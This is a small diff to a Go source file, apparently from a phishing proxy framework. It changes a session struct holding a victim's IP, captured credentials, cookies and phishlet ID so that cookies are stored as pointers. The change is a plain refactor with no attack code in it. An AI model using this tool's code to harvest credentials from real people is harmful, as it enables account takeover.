@@ -12,7 +12,7 @@ type SessionData struct {
 	SessionID   string
 	VictimIP    string
 	Credentials *database.Credentials
-	Cookies     []database.Cookie
+	Cookies     []*database.Cookie
 	PhishletID  string
 	UserAgent   string
 }
